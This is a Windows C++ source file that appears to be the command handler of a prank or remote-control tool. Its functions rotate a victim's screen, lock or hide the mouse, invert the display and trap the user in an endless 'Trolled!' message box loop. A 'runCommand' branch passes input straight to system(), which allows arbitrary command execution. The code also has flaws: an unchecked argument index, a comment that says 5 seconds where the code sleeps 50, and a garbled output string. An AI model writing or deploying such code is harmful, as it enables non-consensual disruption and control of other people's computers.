// commands.cpp
#include "commands.hpp"
#include <windows.h>
#include <iostream>
#include <cstdlib> // for commands (system() method)
#include <sstream>
#include <vector>
#include <string>
#include <thread>
#include <chrono> // for sleep

#ifndef DMDO_DEFAULT
#define DMDO_DEFAULT 0  // Define as per the expected values
#endif

#ifndef DMDO_90
#define DMDO_90 1
#endif

#ifndef DMDO_180
#define DMDO_180 2
#endif

#ifndef DMDO_270
#define DMDO_270 3
#endif

#ifndef DM_DISPLAYORIENTATION
#define DM_DISPLAYORIENTATION 0x00000080 // This is the typical value for DM_DISPLAYORIENTATION
#endif

std::vector<std::string> splitSentenceIntoWords(const std::string& sentence) {
    std::istringstream iss(sentence);
    std::vector<std::string> words;

    std::string word;
    while (iss >> word) {
        words.push_back(word);
    }

    return words; // array of type std::string
}

void processCommand(const std::string& command) {
    // split the command into words
    std::vector<std::string> words = splitSentenceIntoWords(command); // words[0] is the command itself and the rest are args
    if (command == "rotate_screen") {
        rotateScreen();
    } else if (command == "disable_mouse") {
        disableMouse();
    } else if (command == "enable_mouse") {
        enableMouse();
    } else if (words[0] == "runCommand") {
        runCommand(words[1]);
    } else if (words[0] == "change_console_color") { // New command to change color
        changeConsoleColor(); // Call the new function
    } else {
        std::cout << "Unknown command: " << command << std::endl;
    }
}

void rotateScreen() {
    DEVMODE dm;
    EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm);
    
    if (dm.dmDisplayOrientation == DMDO_DEFAULT) {
        dm.dmDisplayOrientation = DMDO_90;
    } else if (dm.dmDisplayOrientation == DMDO_90) {
        dm.dmDisplayOrientation = DMDO_180;
    } else if (dm.dmDisplayOrientation == DMDO_180) {
        dm.dmDisplayOrientation = DMDO_270;
    } else {
        dm.dmDisplayOrientation = DMDO_DEFAULT;
    }
    
    dm.dmFields = DM_DISPLAYORIENTATION;
    ChangeDisplaySettings(&dm, 0);
    std::cout << "Screen rotated." << std::endl;
}

void disableMouse() {
    RECT rect = {0, 0, 1, 1};
    ClipCursor(&rect);
    std::cout << "Mouse disabled." << std::endl;
}

void enableMouse() {
    ClipCursor(NULL); // Re-enables mouse movement
    std::cout << "Mouse enabled." << std::endl;
}

void runCommand(const std::string& command) {
    system(command.c_str());
}

// Function to change the console background color
void changeConsoleColor() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    
    // Generate random colors for background (0-15 are valid color codes)
    int color = rand() % 16;

    // Set the console background color
    SetConsoleTextAttribute(hConsole, color << 4); // Background colors are the high 4 bits
    std::cout << "Console background color changed." << std::endl;
}

void invertColors() {
    HDC hdc = GetDC(NULL);
    BitBlt(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
           hdc, 0, 0, NOTSRCCOPY);
    ReleaseDC(NULL, hdc);
}

void trollMessageBox() {
    while (true) {
        MessageBox(NULL, "Just... Why?", "Trolled!", MB_OK | MB_ICONERROR);
    }
}

void hideMouseCursor() {
    // Hide the mouse cursor
    ShowCursor(FALSE);
    std::cout << "Mouse cursor hidden." << std::endl;
    
    // Sleep for 5 seconds before showing the cursor again
    std::this_thread::sleep_for(std::chrono::seconds(50));

    // Show the mouse cursor again
    ShowCursor(TRUE);
    std::cout << "Mouse cursor redappawdawdeared." << std::endl;
}